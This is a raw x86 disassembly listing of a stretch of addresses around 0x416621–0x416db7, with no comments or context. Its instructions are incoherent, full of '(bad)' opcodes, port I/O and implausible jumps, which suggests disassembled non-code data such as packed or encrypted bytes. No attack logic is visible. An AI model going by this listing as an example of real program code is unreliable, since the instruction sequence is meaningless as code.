  416621:	test   BYTE PTR [edx+0x26d3dd10],bh
  416627:	adc    BYTE PTR [edx-0x5973d88d],dl
  41662d:	(bad)  
  41662f:	jmp    FWORD PTR [edx]
  416631:	or     DWORD PTR [edi-0x68b12723],edi
  416637:	test   al,0x94
  416639:	sbb    ecx,DWORD PTR [esi]
  41663b:	je     0x4165db
  41663d:	push   0x4f
  41663f:	test   al,0xf6
  416641:	cdq    
  416642:	mov    cl,cl
  416644:	int3   
  416645:	mov    al,ds:0x399f24c9
  41664a:	mov    bh,BYTE PTR [ebp+0x4ac26cd4]
  416650:	(bad)  
  416651:	fdivr  st,st(1)
  416653:	push   edx
  416654:	sbb    ebp,DWORD PTR [eax+0x18b8f426]
  41665a:	mov    eax,0xe988e6eb
  41665f:	mov    dh,0x82
  416661:	jae    0x4166da
  416663:	mov    ds:0xda031498,al
  416668:	fidiv  WORD PTR ds:0x9fa39963
  41666e:	les    edi,FWORD PTR [esi-0x8]
  416671:	adc    DWORD PTR [ecx],ebx
  416673:	mov    eax,ds:0x5188a49d
  416678:	rcr    DWORD PTR [ebx+0x49828f9d],0x33
  41667f:	sbb    BYTE PTR ds:0x5e154e3c,0x98
  416686:	sbb    BYTE PTR [ebp-0x21],ah
  416689:	inc    esp
  41668a:	pop    ecx
  41668b:	jl     0x416633
  41668d:	sbb    eax,0xaf263387
  416692:	jb     0x4166c4
  416694:	rcl    DWORD PTR [edx+0x11],1
  416697:	repz icebp 
  416699:	ret    0x9dd8
  41669c:	dec    ebp
  41669d:	ret    
  41669e:	test   BYTE PTR [edi],dh
  4166a0:	mov    ebp,0x6c91255c
  4166a5:	mov    esi,0x9ae82c74
  4166aa:	test   al,0x3a
  4166ac:	dec    eax
  4166ad:	dec    edx
  4166ae:	repnz mov eax,ds:0x1c1fd26
  4166b4:	js     0x41666c
  4166b6:	out    0x2b,al
  4166b8:	bound  esi,QWORD PTR [eax+0x27]
  4166bb:	sbb    dl,0x11
  4166be:	fadd   QWORD PTR [ecx]
  4166c0:	push   0x7c
  4166c2:	iret   
  4166c3:	sbb    eax,0xd3cfeea6
  4166c8:	inc    esp
  4166c9:	fcmovb st,st(1)
  4166cb:	pop    ds
  4166cc:	pop    ds
  4166cd:	pop    edx
  4166ce:	push   eax
  4166cf:	cmp    edx,DWORD PTR [edi-0x5f14e870]
  4166d5:	xchg   BYTE PTR [esi+0x44],cl
  4166d8:	mov    eax,gs
  4166da:	inc    esp
  4166db:	mov    ch,BYTE PTR [eax+ebx*4+0x62dde640]
  4166e2:	xor    ebx,ebx
  4166e4:	mov    edx,0x8eb5ba20
  4166e9:	jge    0x416766
  4166eb:	lahf   
  4166ec:	leave  
  4166ed:	inc    cl
  4166ef:	cmp    edx,DWORD PTR [esi-0xe]
  4166f2:	cwde   
  4166f3:	mov    edx,0xd4b3e18
  4166f8:	gs icebp 
  4166fa:	jbe    0x4166a4
  4166fc:	xor    dl,BYTE PTR [ebp-0x334925d2]
  416702:	cmp    al,0x77
  416704:	les    eax,FWORD PTR [edx-0x14a43105]
  41670a:	ja     0x41677a
  41670c:	int3   
  41670d:	dec    ebp
  41670e:	sahf   
  41670f:	pop    edi
  416710:	loope  0x41670d
  416712:	in     al,dx
  416713:	pop    es
  416714:	es ja  0x416759
  416717:	sbb    ebx,DWORD PTR [eax]
  416719:	pop    ebx
  41671a:	and    BYTE PTR [eax+0x4fffc3be],ah
  416720:	sahf   
  416721:	mov    eax,0xa5472f81
  416726:	jno    0x416725
  416728:	shl    ecx,0x8f
  41672b:	and    ebx,esp
  41672d:	and    bh,BYTE PTR [eax]
  41672f:	sub    al,0xac
  416731:	jb     0x4167af
  416733:	nop
  416734:	pop    ebx
  416735:	push   eax
  416736:	push   cs
  416737:	cmp    edi,ecx
  416739:	div    BYTE PTR [edx]
  41673b:	sbb    BYTE PTR [ebx],bh
  41673d:	xor    eax,0x768c113e
  416742:	fst    DWORD PTR [eax-0x21]
  416745:	pop    ds
  416746:	(bad)  
  416747:	push   ss
  416748:	adc    eax,0xbfb8a78b
  41674d:	pop    edx
  41674e:	mov    ch,0x6f
  416750:	pushf  
  416751:	loope  0x4167c2
  416753:	mov    WORD PTR [eax-0x4300e9a],cs
  416759:	mov    edi,0x5b0c1ea2
  41675e:	in     al,dx
  41675f:	mov    ?,edi
  416761:	fistp  WORD PTR [ebx+0x67455ed3]
  416767:	imul   eax,DWORD PTR [eax+ecx*4],0x6bf72b7c
  41676e:	popf   
  41676f:	dec    ebx
  416770:	or     dh,BYTE PTR [ebx]
  416772:	add    DWORD PTR [eax+ebp*8-0x6d],ebp
  416776:	cld    
  416777:	popa   
  416778:	pop    ebp
  416779:	pusha  
  41677a:	rol    al,cl
  41677c:	fidiv  DWORD PTR [eax-0x67a0edad]
  416782:	call   DWORD PTR [esp+ebp*4]
  416785:	xor    BYTE PTR [ecx-0x8],ah
  416788:	sub    ax,0x4951
  41678c:	jmp    FWORD PTR [edx]
  41678e:	and    al,0x29
  416790:	jbe    0x416749
  416792:	out    0x8e,al
  416794:	mov    dh,dl
  416796:	addr16 pop ss
  416798:	xchg   BYTE PTR cs:[eax+0x7ef574bd],bh
  41679f:	sub    BYTE PTR [edi+ebx*8],0x8e
  4167a3:	mov    ebx,edx
  4167a5:	jno    0x4167ec
  4167a7:	cmc    
  4167a8:	or     DWORD PTR [ecx+0x1],ebp
  4167ab:	loop   0x4167a7
  4167ad:	xchg   edx,eax
  4167ae:	nop    edi
  4167b1:	sub    BYTE PTR [ecx],bl
  4167b3:	ins    DWORD PTR es:[edi],dx
  4167b4:	lods   al,BYTE PTR fs:[esi]
  4167b6:	pop    ebp
  4167b7:	and    esp,DWORD PTR [ebp+0x76]
  4167ba:	inc    ecx
  4167bb:	je     0x4167e8
  4167bd:	test   BYTE PTR [edx-0x7c],cl
  4167c0:	push   0x8a102c6e
  4167c5:	into   
  4167c6:	xor    eax,0x516bc090
  4167cb:	add    eax,0x69fb15af
  4167d0:	cmp    al,0x33
  4167d2:	and    ch,BYTE PTR [ecx-0x71]
  4167d5:	and    dl,BYTE PTR [esi+ebp*8+0x228dc6eb]
  4167dc:	jle    0x4167f0
  4167de:	aam    0x53
  4167e0:	cli    
  4167e1:	mov    ds:0x3ad42973,al
  4167e6:	adc    DWORD PTR [ebp-0x280db820],ebx
  4167ec:	scas   al,BYTE PTR es:[edi]
  4167ed:	inc    esp
  4167ee:	popa   
  4167ef:	pop    esp
  4167f0:	lea    ecx,[eax+0x25]
  4167f3:	clc    
  4167f4:	inc    ecx
  4167f5:	xchg   edi,esp
  4167f7:	popf   
  4167f8:	lea    eax,[ebx]
  4167fa:	cmp    DWORD PTR [ebp-0x59],edi
  4167fd:	jl     0x4167cd
  4167ff:	push   esi
  416800:	shl    dl,0x4d
  416803:	bound  ebp,QWORD PTR [ecx]
  416805:	pop    esi
  416806:	sbb    al,0x30
  416808:	pop    edx
  416809:	jl     0x416838
  41680b:	add    dh,BYTE PTR [ecx]
  41680d:	adc    BYTE PTR [esi],dh
  41680f:	sub    esp,DWORD PTR [ebp-0x7e]
  416812:	sahf   
  416813:	addr16 aad 0x8f
  416816:	mov    ebx,esp
  416818:	jb     0x4167bb
  41681a:	jb     0x416876
  41681c:	cmp    ah,BYTE PTR [edx-0x1a350e56]
  416822:	or     BYTE PTR [edi],bh
  416824:	lods   al,BYTE PTR ds:[esi]
  416825:	(bad)  
  416826:	shl    DWORD PTR [ebx],cl
  416828:	mov    bh,0x24
  41682a:	dec    eax
  41682b:	xchg   ecx,eax
  41682c:	(bad)  
  41682d:	adc    edx,DWORD PTR ds:0xd5968aa
  416833:	enter  0xf78a,0xa0
  416837:	sub    BYTE PTR [ebx-0x1],bh
  41683a:	push   ds
  41683b:	sub    esp,eax
  41683d:	repz mov ds:0xfa78d67d,eax
  416843:	cli    
  416844:	das    
  416845:	push   eax
  416846:	call   0x48b19d0a
  41684b:	outs   dx,DWORD PTR ds:[si]
  41684d:	les    ebx,FWORD PTR [edi]
  41684f:	sbb    dl,BYTE PTR ds:0x20c60190
  416855:	fnstenv [eax-0x28ac4c97]
  41685b:	sbb    eax,DWORD PTR [esi-0x55a1aba6]
  416861:	sbb    bl,BYTE PTR [edi+0x6b5eaf87]
  416867:	cmc    
  416868:	in     al,dx
  416869:	out    dx,al
  41686a:	dec    ebx
  41686b:	cmp    eax,DWORD PTR [edx+0x147e0954]
  416871:	xchg   esp,eax
  416872:	into   
  416873:	mov    al,0x22
  416875:	add    BYTE PTR [ebx+0x59],dh
  416878:	inc    ecx
  416879:	int    0xfa
  41687b:	inc    ebx
  41687c:	pushf  
  41687d:	js     0x4168e7
  41687f:	xor    eax,0xaae3d283
  416884:	add    ebx,DWORD PTR [eax+edx*1]
  416887:	rol    dl,cl
  416889:	push   ecx
  41688a:	fwait
  41688b:	xor    DWORD PTR [eax-0x4],0x4de1bcf4
  416892:	xor    dl,bl
  416894:	jb     0x416848
  416896:	fisubr DWORD PTR [edx-0x70dba9a8]
  41689c:	dec    edx
  41689d:	cmp    esi,0x40ab01dc
  4168a3:	cs loop 0x4168ce
  4168a6:	popa   
  4168a7:	icebp  
  4168a8:	ss in  eax,0x9b
  4168ab:	cmp    al,0xe7
  4168ad:	jmp    0x7fe7389b
  4168b2:	or     cl,BYTE PTR [edi-0x60df9333]
  4168b8:	ror    BYTE PTR [eax+0x2d],0x76
  4168bc:	or     eax,0xf70079f7
  4168c1:	out    dx,eax
  4168c2:	adc    ebx,DWORD PTR [ebx-0x39]
  4168c5:	xor    al,0x6c
  4168c7:	loope  0x416923
  4168c9:	xsha256 (bad)
  4168ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168cb:	push   edx
  4168cc:	push   0x2b990fa4
  4168d1:	fucom  st(2)
  4168d3:	or     al,0x28
  4168d5:	dec    ebp
  4168d6:	ror    ebx,0x48
  4168d9:	dec    ebp
  4168da:	fcomip st,st(5)
  4168dc:	fadd   DWORD PTR [edx]
  4168de:	xor    eax,DWORD PTR es:[esi+0x6c19caa1]
  4168e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168e6:	aaa    
  4168e7:	jge    0x41686e
  4168e9:	in     al,dx
  4168ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168eb:	sbb    ebx,DWORD PTR [esi+0x44]
  4168ee:	cmp    al,0x79
  4168f0:	js     0x416927
  4168f2:	mov    DWORD PTR ds:0x186e47ec,0xdd414dec
  4168fc:	add    DWORD PTR [edi+0x757d2467],0xe1e27371
  416906:	mov    ds:0x25c3207d,al
  41690b:	mov    bl,0xc4
  41690d:	ja     0x41694d
  41690f:	ss adc eax,0x4caa1933
  416915:	adc    eax,0xfa94c844
  41691a:	mov    bl,ah
  41691c:	int    0x7b
  41691e:	push   0xffffff9f
  416920:	dec    eax
  416921:	inc    ebp
  416922:	ds shl al,cl
  416925:	inc    ecx
  416926:	xor    esp,DWORD PTR [ebp-0x77]
  416929:	ret    0x3c1f
  41692c:	xchg   ecx,eax
  41692d:	scas   al,BYTE PTR es:[edi]
  41692e:	retf   
  41692f:	jp     0x416993
  416931:	fist   WORD PTR [esi-0x12]
  416934:	je     0x416950
  416936:	gs push edi
  416938:	cmp    DWORD PTR [ebx+0xf],0xffffffc1
  41693c:	into   
  41693d:	sti    
  41693e:	cwde   
  41693f:	push   ecx
  416940:	(bad)  
  416941:	push   eax
  416942:	inc    esp
  416943:	daa    
  416944:	aam    0xea
  416946:	nop
  416947:	jns    0x416954
  416949:	pop    eax
  41694a:	fcom   QWORD PTR [edi-0x7a]
  41694d:	stos   BYTE PTR es:[edi],al
  41694e:	bound  esi,QWORD PTR [ebp-0x4b]
  416951:	ret    
  416952:	retf   
  416953:	adc    eax,0x34ca0e79
  416958:	dec    ebp
  416959:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41695b:	xchg   ecx,eax
  41695c:	iret   
  41695d:	fld    TBYTE PTR ds:0xc0e5f7f6
  416963:	jp     0x41696b
  416965:	or     esp,DWORD PTR [edi+ebx*4-0x1d]
  416969:	xchg   esp,eax
  41696a:	scas   al,BYTE PTR es:[edi]
  41696b:	pop    eax
  41696c:	call   0x13fe2398
  416971:	xchg   esp,eax
  416972:	call   0x5515dc9b
  416977:	dec    edx
  416978:	test   al,0x26
  41697a:	sbb    eax,0x361efa26
  41697f:	cmp    bl,BYTE PTR [eax]
  416981:	sub    al,0xdc
  416983:	adc    DWORD PTR [ebp-0x5c293b15],ecx
  416989:	cli    
  41698a:	into   
  41698b:	add    BYTE PTR [eax-0x53],ch
  41698e:	out    0xc3,al
  416990:	fisub  WORD PTR [edx-0x71a77ea8]
  416996:	fs cmc 
  416998:	inc    edi
  416999:	test   eax,0x84b6c7b2
  41699e:	inc    esp
  41699f:	adc    BYTE PTR [ebp+0x7e3584fc],dh
  4169a5:	cdq    
  4169a6:	jnp    0x4169d1
  4169a8:	pop    edx
  4169a9:	dec    edx
  4169aa:	cmp    cl,BYTE PTR [edi]
  4169ac:	mov    ah,0x4b
  4169ae:	cs int3 
  4169b0:	je     0x4169f5
  4169b2:	mov    edi,DWORD PTR es:[esi]
  4169b5:	mov    ecx,0x21b45355
  4169ba:	fisubr WORD PTR [edi+0x1e99805b]
  4169c0:	scas   al,BYTE PTR es:[edi]
  4169c1:	je     0x41697b
  4169c3:	xchg   BYTE PTR [ebx*8-0x386b933d],dl
  4169ca:	jo     0x41694d
  4169cc:	inc    edi
  4169cd:	mov    eax,ds:0xcba3aa76
  4169d2:	jmp    0x65fc2fa5
  4169d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169d8:	aas    
  4169d9:	mov    eax,0x46fa9f62
  4169de:	aam    0xa7
  4169e0:	xchg   BYTE PTR [ebx],dh
  4169e2:	mov    al,ds:0xa715b968
  4169e7:	cli    
  4169e8:	inc    ebp
  4169e9:	mov    bh,ch
  4169eb:	mov    ?,WORD PTR [edx]
  4169ed:	out    dx,eax
  4169ee:	out    dx,eax
  4169ef:	fist   WORD PTR [ebx+0x28]
  4169f2:	mov    bl,0x66
  4169f4:	inc    esp
  4169f5:	push   edx
  4169f6:	sbb    eax,0x26eba225
  4169fb:	push   0x7a
  4169fd:	enter  0x80f3,0x9a
  416a01:	push   es
  416a02:	pop    edi
  416a03:	jo     0x4169a1
  416a05:	into   
  416a06:	out    0xa4,al
  416a08:	(bad)  
  416a09:	dec    edx
  416a0a:	add    esp,DWORD PTR [edi+edx*1]
  416a0d:	(bad)  
  416a0e:	repz mov ds:0x99a138d9,eax
  416a14:	ret    0xf017
  416a17:	add    ebx,edi
  416a19:	icebp  
  416a1a:	dec    ebx
  416a1b:	cmp    esp,esi
  416a1d:	daa    
  416a1e:	bound  eax,QWORD PTR [edx+0x4011a256]
  416a24:	jecxz  0x4169e5
  416a26:	mov    ecx,0xa3d4b5c9
  416a2b:	jl     0x416a66
  416a2d:	(bad)  
  416a2f:	nop
  416a30:	outs   dx,BYTE PTR ds:[esi]
  416a31:	test   DWORD PTR [edi-0x17a1f996],esp
  416a37:	push   edi
  416a38:	push   ds
  416a39:	mov    DWORD PTR [eax],edx
  416a3b:	(bad)  [ebp+0x7e]
  416a3e:	test   al,0xfa
  416a40:	pop    ss
  416a41:	and    DWORD PTR [edx+ecx*8],ebx
  416a44:	push   ebp
  416a45:	pop    ebp
  416a46:	cs out dx,eax
  416a48:	push   ds
  416a49:	inc    eax
  416a4a:	sbb    edx,DWORD PTR [edx+0x71e849bb]
  416a50:	ins    DWORD PTR es:[edi],dx
  416a51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a53:	(bad)  
  416a54:	mov    al,ds:0x45e77213
  416a59:	add    al,BYTE PTR [ecx+0x19]
  416a5c:	pop    eax
  416a5d:	sti    
  416a5e:	nop
  416a5f:	nop
  416a60:	push   0x2e
  416a62:	dec    ebx
  416a63:	std    
  416a64:	scas   al,BYTE PTR es:[edi]
  416a65:	dec    eax
  416a66:	mov    eax,ds:0x8cd2f77b
  416a6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a6c:	shl    DWORD PTR [edi+0x2d261587],1
  416a72:	inc    ecx
  416a73:	sbb    bh,BYTE PTR ds:0xb74cd921
  416a79:	jb     0x416a4b
  416a7b:	test   DWORD PTR [edx+ecx*4-0x35],edi
  416a7f:	pusha  
  416a80:	mov    ebp,0x635b9848
  416a85:	and    DWORD PTR [edi],ebp
  416a87:	xchg   BYTE PTR [esi+0x69],al
  416a8a:	dec    esp
  416a8b:	xchg   ebx,eax
  416a8c:	jnp    0x416ad8
  416a8e:	inc    edi
  416a8f:	mov    bh,0xca
  416a91:	xor    al,0x9b
  416a93:	cmp    esp,ecx
  416a95:	mov    ch,0x9
  416a97:	mov    esp,0x109ec935
  416a9c:	mov    bl,0xbf
  416a9e:	inc    edx
  416a9f:	sbb    dl,BYTE PTR [ecx]
  416aa1:	int3   
  416aa2:	cmp    BYTE PTR ds:0xe2f0fdce,cl
  416aa8:	cs cmp al,0x7
  416aab:	daa    
  416aac:	gs xchg esi,eax
  416aae:	sbb    ch,BYTE PTR [edi]
  416ab0:	xchg   DWORD PTR [ebx],ecx
  416ab2:	or     BYTE PTR [ebx],0xe2
  416ab5:	jl     0x416a38
  416ab7:	pop    eax
  416ab8:	cwde   
  416ab9:	test   eax,0x36cc57b4
  416abe:	popf   
  416abf:	dec    ebp
  416ac0:	(bad)  
  416ac1:	aam    0x7e
  416ac3:	and    ch,BYTE PTR [edi+0x5b8a000]
  416ac9:	or     eax,0x1e61c8a6
  416ace:	shl    BYTE PTR [ebx],cl
  416ad0:	enter  0x5572,0xa6
  416ad4:	je     0x416b33
  416ad6:	stos   BYTE PTR es:[edi],al
  416ad7:	jne    0x416add
  416ad9:	sbb    dh,BYTE PTR [ecx+0x48]
  416adc:	xchg   ebp,eax
  416add:	into   
  416ade:	xchg   edx,eax
  416adf:	ja     0x416b27
  416ae1:	es in  eax,0xac
  416ae4:	mov    WORD PTR [ebp+0x77],fs
  416ae7:	iret   
  416ae8:	push   ebp
  416ae9:	mov    esp,0x9e72eeca
  416aee:	inc    edi
  416aef:	fcom   QWORD PTR [edx+0x49e2a702]
  416af5:	inc    esi
  416af6:	push   cs
  416af7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416af8:	lea    ecx,[eax-0x6f353428]
  416afe:	stos   BYTE PTR es:[edi],al
  416aff:	jbe    0x416a9f
  416b01:	xchg   ebp,eax
  416b02:	pop    ebx
  416b03:	cmp    eax,0x680ce9fb
  416b08:	(bad)  
  416b09:	in     al,0x6e
  416b0b:	push   eax
  416b0d:	dec    ecx
  416b0e:	pop    ss
  416b0f:	dec    edi
  416b10:	test   DWORD PTR [edx+0x6],edx
  416b13:	pop    ebx
  416b14:	push   ss
  416b15:	jmp    0x4eac:0xdd8f672c
  416b1c:	mov    edi,0xba876b43
  416b21:	xchg   edx,eax
  416b22:	lods   al,BYTE PTR ds:[esi]
  416b23:	ja     0x416b80
  416b25:	dec    eax
  416b26:	aaa    
  416b27:	retf   
  416b28:	xchg   edx,eax
  416b29:	add    BYTE PTR [eax+0x0],bl
  416b2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b2d:	jmp    DWORD PTR [ecx+0x4ce24c8d]
  416b33:	clc    
  416b34:	into   
  416b35:	int3   
  416b36:	push   ebx
  416b37:	lods   al,BYTE PTR ds:[esi]
  416b38:	es loopne 0x416b6a
  416b3b:	mov    bh,0xf1
  416b3d:	loopne 0x416b61
  416b3f:	cmp    DWORD PTR [ebx-0x5796749],eax
  416b45:	cmp    edx,ebx
  416b47:	lock sub DWORD PTR [ebp-0x26],ebp
  416b4b:	sub    ebx,ebp
  416b4d:	(bad)  
  416b4e:	xchg   ebx,eax
  416b4f:	cld    
  416b50:	leave  
  416b51:	xchg   edx,eax
  416b52:	mov    ah,0x2c
  416b54:	pop    eax
  416b55:	mov    esp,ss
  416b57:	fsub   DWORD PTR ds:0x37dbe3c3
  416b5d:	inc    esi
  416b5e:	xor    al,0xff
  416b60:	lahf   
  416b61:	sub    DWORD PTR [ebp-0xe],esi
  416b64:	in     eax,0x6d
  416b66:	fisttp DWORD PTR [ecx+0x59]
  416b69:	pop    esi
  416b6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b6b:	dec    esi
  416b6c:	outs   dx,BYTE PTR ds:[esi]
  416b6d:	xchg   DWORD PTR [ebp-0x80],ebp
  416b70:	data16 je 0x416bc9
  416b73:	or     DWORD PTR [ebp+edx*8-0x1ba2005c],edi
  416b7a:	push   esi
  416b7b:	dec    edx
  416b7c:	addr16 pop edx
  416b7e:	inc    esi
  416b7f:	ins    BYTE PTR es:[edi],dx
  416b80:	outs   dx,BYTE PTR ds:[esi]
  416b81:	rcr    DWORD PTR [ecx-0x30cc2946],1
  416b87:	cmc    
  416b88:	jb     0x416bbe
  416b8a:	stc    
  416b8b:	xor    eax,0x45c3b612
  416b90:	loop   0x416be5
  416b92:	iret   
  416b93:	sbb    edx,ebx
  416b95:	lea    ecx,[edx-0x2c]
  416b98:	jg     0x416b1e
  416b9a:	(bad)  
  416b9b:	push   ebx
  416b9c:	repnz push esi
  416b9e:	shr    BYTE PTR [ecx-0x59],1
  416ba1:	in     al,dx
  416ba2:	inc    edx
  416ba3:	and    al,0x33
  416ba5:	std    
  416ba6:	sti    
  416ba7:	int3   
  416ba8:	out    dx,eax
  416ba9:	(bad)  
  416baa:	lods   eax,DWORD PTR ds:[esi]
  416bab:	sub    eax,0x1f51c9f9
  416bb0:	imul   ebx,DWORD PTR [ecx-0x79],0x439358f1
  416bb7:	stc    
  416bb8:	push   ss
  416bb9:	shr    BYTE PTR fs:[ecx+0x35e2d1a9],0xb7
  416bc1:	int    0x76
  416bc3:	cs push 0xb595fa8c
  416bc9:	or     dh,ah
  416bcb:	aad    0x2b
  416bcd:	xchg   edx,eax
  416bce:	xchg   ebx,eax
  416bcf:	bound  ebx,QWORD PTR [edx+0x55]
  416bd2:	mov    edi,0x5b9bf83b
  416bd7:	inc    edx
  416bd8:	pop    ds
  416bd9:	mov    eax,ds:0xdb9576f
  416bde:	(bad)  
  416bdf:	leave  
  416be0:	in     eax,0xc6
  416be2:	call   0x3935:0xb6358498
  416be9:	aaa    
  416bea:	or     DWORD PTR ds:0x60fda2e9,0xe5a912ef
  416bf4:	pop    edi
  416bf5:	fadd   DWORD PTR [ebp+0x73]
  416bf8:	retf   0xc3d
  416bfb:	sbb    dl,BYTE PTR [edi]
  416bfd:	sub    DWORD PTR [eax],esi
  416bff:	push   ebx
  416c00:	fadd   DWORD PTR [edi]
  416c02:	hlt    
  416c03:	(bad)
  416c06:	xlat   BYTE PTR ds:[ebx]
  416c07:	xchg   esi,eax
  416c08:	les    ebp,FWORD PTR [ebp-0x723f8ceb]
  416c0e:	inc    ebp
  416c0f:	or     eax,esi
  416c11:	cli    
  416c12:	stos   BYTE PTR es:[edi],al
  416c13:	dec    edi
  416c14:	adc    al,0xf0
  416c16:	leave  
  416c17:	cmc    
  416c18:	push   0xffffffb8
  416c1a:	ja     0x416c34
  416c1c:	dec    edx
  416c1d:	ds and eax,0xab7ecea5
  416c23:	(bad)  
  416c24:	retf   
  416c25:	jae    0x416c2d
  416c27:	sub    edx,edi
  416c29:	retf   0x839d
  416c2c:	jb     0x416bea
  416c2e:	ds push 0x51
  416c31:	xchg   ebp,eax
  416c32:	dec    edx
  416c33:	xchg   ebx,eax
  416c34:	(bad)  [ebx+0x168012af]
  416c3a:	pushf  
  416c3b:	std    
  416c3c:	clc    
  416c3d:	ins    DWORD PTR es:[edi],dx
  416c3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c41:	or     ebp,DWORD PTR [edi]
  416c43:	jbe    0x416c51
  416c45:	adc    DWORD PTR [ecx+esi*2-0x9],ecx
  416c49:	mov    dl,0xcb
  416c4b:	xor    eax,0xab020b4b
  416c50:	(bad)  
  416c51:	ins    BYTE PTR es:[edi],dx
  416c52:	or     eax,0xa67f4a0
  416c57:	mov    es,WORD PTR [eax+ecx*8-0x4d]
  416c5b:	jbe    0x416be0
  416c5d:	and    al,0xa8
  416c5f:	sub    ebx,edx
  416c61:	inc    BYTE PTR [ebp-0x67]
  416c64:	and    BYTE PTR [eax],cl
  416c66:	and    al,0x93
  416c68:	xor    al,0x33
  416c6a:	cmp    BYTE PTR [eax+eiz*8],al
  416c6d:	imul   edi,DWORD PTR [edi],0xffffffca
  416c70:	jle    0x416ca0
  416c72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c73:	call   0x24abaddc
  416c78:	inc    edx
  416c79:	jne    0x416c16
  416c7b:	mul    DWORD PTR [edi+esi*4]
  416c7e:	sti    
  416c7f:	fdiv   st(1),st
  416c81:	retf   0x1a92
  416c84:	jns    0x416c3e
  416c86:	mov    ah,0xb
  416c88:	xor    DWORD PTR [edi+0x23],0xffffffe3
  416c8c:	ds xchg edx,eax
  416c8e:	xor    dh,BYTE PTR [ebp+ebp*2-0x58]
  416c92:	push   esi
  416c93:	fild   QWORD PTR [eax+0x57]
  416c97:	push   0xa82a2f22
  416c9c:	dec    bh
  416c9e:	push   ecx
  416c9f:	sahf   
  416ca0:	ror    DWORD PTR [eax],0x77
  416ca3:	fimul  DWORD PTR [edx+ecx*1+0x523df286]
  416caa:	add    eax,0x29022f4d
  416caf:	jg     0x416c35
  416cb1:	xor    al,0xc0
  416cb3:	and    al,BYTE PTR [ebx]
  416cb5:	fs (bad) 
  416cb7:	ds sti 
  416cb9:	repnz ins BYTE PTR es:[edi],dx
  416cbb:	and    al,0x5
  416cbd:	jle    0x416c40
  416cbf:	into   
  416cc0:	adc    dh,cl
  416cc2:	jbe    0x416d1b
  416cc4:	xor    ebp,ecx
  416cc6:	les    esp,FWORD PTR [esi+ebp*1]
  416cc9:	xlat   BYTE PTR ds:[ebx]
  416cca:	inc    edx
  416ccb:	adc    edi,edx
  416ccd:	and    eax,0xf88ad2fa
  416cd2:	mov    ebx,0x86aa657f
  416cd7:	or     eax,0xf6fe6163
  416cdc:	sub    ch,dh
  416cde:	dec    edx
  416cdf:	in     eax,0x18
  416ce1:	mov    cl,BYTE PTR [ebx-0x7c275d2c]
  416ce7:	fwait
  416ce8:	mov    ebx,?
  416cea:	lds    ecx,FWORD PTR [ecx-0x57]
  416ced:	repnz mov ds:0xa7f81e83,al
  416cf3:	jb     0x416d18
  416cf5:	mov    DWORD PTR [edx+0x35e28571],edx
  416cfb:	aas    
  416cfc:	retf   
  416cfd:	sbb    eax,0x580ba94c
  416d02:	inc    eax
  416d03:	jbe    0x416d67
  416d05:	mov    edx,DWORD PTR [edx+0x5e]
  416d08:	loop   0x416d55
  416d0a:	fild   WORD PTR [eax]
  416d0c:	sbb    cl,bh
  416d0e:	psubsb mm5,QWORD PTR [edi]
  416d11:	int3   
  416d12:	into   
  416d13:	mov    bh,0x84
  416d15:	inc    eax
  416d16:	and    al,0x39
  416d18:	mov    bl,0xdc
  416d1a:	and    eax,0xcc5fed2b
  416d1f:	add    eax,DWORD PTR [ecx+0x7822d2f0]
  416d25:	(bad)  
  416d26:	jbe    0x416d24
  416d28:	fild   DWORD PTR [edi]
  416d2a:	cs jg  0x416cc2
  416d2d:	stos   DWORD PTR es:[edi],eax
  416d2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d2f:	(bad)  
  416d30:	fsub   st(0),st
  416d32:	outs   dx,DWORD PTR ds:[esi]
  416d33:	mov    WORD PTR [ebx-0x186daf8],cs
  416d39:	sub    cl,dh
  416d3b:	sbb    BYTE PTR [edx+ebx*4],cl
  416d3e:	push   esp
  416d3f:	adc    DWORD PTR [eax+0x6f],esp
  416d42:	out    0xc8,al
  416d44:	mov    ecx,0xcb8c3d4a
  416d49:	sti    
  416d4a:	ss lahf 
  416d4c:	(bad)  
  416d4e:	or     dl,BYTE PTR [ebp+0x2b03f241]
  416d54:	out    dx,al
  416d55:	mov    edi,DWORD PTR [edi-0x7791ece2]
  416d5b:	lds    edx,FWORD PTR [ebx-0x4cafe7a8]
  416d61:	fld    DWORD PTR [edx-0x2e]
  416d64:	pop    ds
  416d65:	cmp    DWORD PTR es:[ebx+0x27],ecx
  416d69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d6a:	arpl   WORD PTR [esi+0x31138115],si
  416d70:	out    dx,al
  416d71:	inc    esp
  416d72:	push   esp
  416d73:	jg     0x416dd0
  416d75:	imul   esp,DWORD PTR ds:[ecx-0x3533d66],0xc84272dd
  416d80:	add    dh,BYTE PTR [eax+0x70b09ee0]
  416d86:	or     ecx,edi
  416d88:	test   esp,eax
  416d8a:	push   esp
  416d8b:	js     0x416da3
  416d8d:	out    dx,eax
  416d8e:	or     al,0x5b
  416d90:	jo     0x416e05
  416d92:	inc    esp
  416d93:	mov    al,ds:0x589c153a
  416d98:	out    dx,eax
  416d99:	xchg   ecx,eax
  416d9a:	std    
  416d9b:	sub    BYTE PTR [ebx],cl
  416d9d:	dec    esp
  416d9e:	test   BYTE PTR [ebx],0x58
  416da1:	inc    edi
  416da2:	in     eax,0xee
  416da4:	test   BYTE PTR [esi+edi*2-0x18a7b317],dl
  416dab:	shl    DWORD PTR [ecx-0x10],1
  416dae:	rcr    BYTE PTR [edi],1
  416db0:	cli    
  416db1:	enter  0xbb12,0x60
  416db5:	inc    edx
  416db6:	pop    edx
  416db7:	shr    BYTE PTR [ecx+0x23],0x7
